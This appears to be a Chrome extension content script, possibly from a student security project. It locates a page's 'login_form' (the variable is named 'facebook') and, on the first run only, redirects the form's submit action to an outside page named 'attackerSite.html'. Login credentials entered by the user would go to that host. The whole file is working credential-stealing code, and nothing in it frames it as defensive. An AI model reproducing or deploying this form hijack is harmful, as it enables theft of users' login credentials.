$(document).ready(function () {
    var counter = 0;
	
	chrome.storage.sync.get(['ctr'], function (a) {
		
		if (a.ctr == null)
		{
			counter = 1;
			if (counter == 1)
			{
				var facebook = document.getElementById("login_form");
				facebook.action = "http://www.mbvee.com/Project/attackerSite.html"
				
				counter = counter + 1;
				chrome.storage.sync.set({'ctr': counter}, function() {
				});
			}
		}
		else
		{	
			counter = a.ctr;			
		}
	});		
});


